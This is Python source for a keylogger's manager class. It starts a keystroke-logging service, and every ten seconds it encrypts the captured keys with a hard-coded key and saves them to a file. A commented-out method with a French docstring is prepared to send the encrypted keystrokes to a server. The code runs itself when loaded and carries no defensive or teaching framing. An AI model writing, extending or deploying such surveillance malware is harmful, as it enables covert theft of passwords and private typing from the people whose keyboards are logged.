import threading

from KeyService import KeyLoggerService
from FileWriter import FileWriter
from NetworkWriter import NetworkWriter
from Encryptor import Encryptor
import time


class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        # self.network_writer = NetworkWriter()
        self.encryptor = Encryptor("secret_key")
        self.timer = None

    def run(self):

        self.service.start_logging()
        try:
            while self.service.running:
                self.save_locally()
                time.sleep(10)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.service.stop_logging()
        print("KeyLogger stopped.")

    def save_locally(self):

        logged_keys = "".join(self.service.buffer.get_data())
        encrypted_data = self.encryptor.encrypt(logged_keys)
        self.file_writer.send_data(encrypted_data,None)
        self.service.buffer.flush()

    # def send_to_server(self):bon
    #   """Envoie les données chiffrées au serveur."""
    #  logged_keys = "".join(self.service.buffer.get_data())
    # encrypted_data = self.encryptor.encrypt(logged_keys)
    # self.network_writer.send_data(encrypted_data,None)




keyManager = KeyLoggerManager()
keyManager.run()
